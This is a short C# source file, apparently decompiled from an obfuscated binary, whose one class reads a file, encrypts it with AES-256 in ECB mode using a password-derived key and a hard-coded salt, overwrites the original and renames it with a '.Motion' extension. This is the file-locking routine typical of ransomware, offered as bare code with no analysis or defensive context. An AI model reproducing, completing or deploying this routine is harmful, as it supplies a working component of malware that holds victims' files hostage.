using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ns0;

internal class Class3
{
	internal void method_0(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = method_1(byte_, string_1);
		File.WriteAllBytes(string_0, bytes);
		File.Move(string_0, string_0 + ".Motion");
	}

	private byte[] method_1(byte[] byte_0, string string_0)
	{
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		using SHA256CryptoServiceProvider sHA256CryptoServiceProvider = new SHA256CryptoServiceProvider();
		byte[] password = sHA256CryptoServiceProvider.ComputeHash(Encoding.BigEndianUnicode.GetBytes(string_0));
		byte[] salt = new byte[8] { 170, 255, 187, 207, 204, 221, 223, 175 };
		using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 1000);
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
		aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.BlockSize / 8);
		aesCryptoServiceProvider.Mode = CipherMode.ECB;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		return aesCryptoServiceProvider.CreateEncryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);
	}
}
